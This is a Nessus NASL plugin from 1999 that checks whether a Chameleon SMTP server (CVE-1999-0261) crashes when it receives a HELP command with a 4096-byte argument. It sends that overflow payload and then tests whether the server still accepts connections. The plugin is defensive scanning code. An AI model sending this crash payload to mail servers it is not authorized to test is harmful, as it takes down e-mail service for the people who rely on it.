#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10042);
 script_bugtraq_id(2387);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-1999-0261");
 name["english"] = "Chameleon SMTPd overflow";
 name["francais"] = "Chameleon SMTPd overflow";
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "It was possible to
crash the remote SMTP server by issuing
the HELP command followed by a too long
argument.

This problem may allow an attacker to
prevent you from sending or receiving
e-mails, thus preventing you to
work properly.


Solution : Update your SMTP server.

Risk factor : High";


 desc["francais"] = "Il s'est avéré
possible de planter le daemon SMTP 
distant en lui envoyant la commande
HELP suivie d'un argument trop long.

Un pirate peut utiliser ce problème 
pour vous empecher de recevoir
et d'envoyer des emails, vous
dérangeant ainsi dans votre travail.

Solution : Mettez à jour votre server SMTP.

Facteur de risque : Elevé";


 script_description(english:desc["english"],
 		    francais:desc["francais"]);
 
 summary["english"] = "Determines if smtpd can be crashed"; 
 summary["francais"] = "Fait planter smtpd";
 script_summary(english:summary["english"],
 		francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 
 family["english"] = "Denial of Service"; 
 family["francais"] = "Déni de service";
 
 script_family(english:family["english"],
 	       francais:family["francais"]);
 script_dependencie("find_service.nes", "sendmail_expn.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("smtp_func.inc");
port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(get_port_state(port))soc = open_sock_tcp(port);
else exit(0);
if(soc)
{
 b = smtp_recv_banner(socket:soc);
 c = string("HELP ", crap(4096), "\r\n");
 send(socket:soc, data:c);
 close(soc);
 soc2 = open_sock_tcp(port);
 if(!soc2)security_hole(port);
 else close(soc2);
}
